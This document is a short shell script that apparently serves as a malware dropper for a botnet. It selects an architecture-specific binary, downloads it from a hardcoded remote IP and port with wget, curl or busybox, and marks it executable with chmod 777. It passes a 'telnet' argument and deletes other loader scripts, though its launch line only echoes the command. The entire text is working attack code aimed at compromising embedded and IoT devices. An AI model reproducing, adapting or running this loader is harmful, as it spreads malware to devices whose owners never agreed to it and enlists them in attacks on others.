#!/bin/sh
H=206.189.40.120:9999
cd /tmp 2>/dev/null||cd /var/run 2>/dev/null||cd /var/tmp 2>/dev/null||cd /data/local/tmp 2>/dev/null||cd /
case "$(uname -m)" in
 aarch64|arm64) B=wj0s.arm64;;
 armv7*|armv8*) B=wj0s.arm7;;
 armv6*|armv5*|arm*) B=wj0s.arm;;
 x86_64|amd64) B=wj0s.x86_64;;
 i686|i386|x86) B=wj0s.i686;;
 mips64*|mips) B=wj0s.mips;;
 mipsel) B=wj0s.mipsel;;
 ppc*|powerpc) B=wj0s.ppc;;
 sh4) B=wj0s.sh4;;
 *) B=wj0s.arm7;;
esac
rm -f "$B"
wget -q http://$H/$B -O "$B" 2>/dev/null || curl -s http://$H/$B -o "$B" 2>/dev/null || busybox wget -q http://$H/$B -O "$B" 2>/dev/null
[ -s "$B" ] || exit 1
chmod 777 "$B"
T="${1:-telnet}"
echo ./"$B" "$T" >/dev/null 2>&1 &
rm -f Mugen.sh Mugen1.sh Mugen2.sh cat.sh
